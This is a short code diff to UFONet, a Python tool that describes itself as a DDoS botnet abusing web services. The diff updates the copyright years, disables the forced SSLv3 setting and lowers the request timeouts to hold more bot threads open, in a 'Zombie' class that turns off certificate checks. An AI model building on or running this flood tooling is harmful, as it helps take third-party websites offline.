@@ -1,7 +1,7 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
+UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -88,7 +88,7 @@ class Zombie: # class representing a zombie
         c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
         c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
         c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
-        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
+#       c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
         c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
         c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
         c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
@@ -127,8 +127,8 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.TIMEOUT, options.timeout)
             c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
         else:
-            c.setopt(pycurl.TIMEOUT, 10)
-            c.setopt(pycurl.CONNECTTIMEOUT, 10)
+            c.setopt(pycurl.TIMEOUT, 5) # trying low value to control OS/python threading overflow when so much threads/bots open
+            c.setopt(pycurl.CONNECTTIMEOUT, 5)
         if options.delay: # set delay
             self.ufo.delay = options.delay
         else:
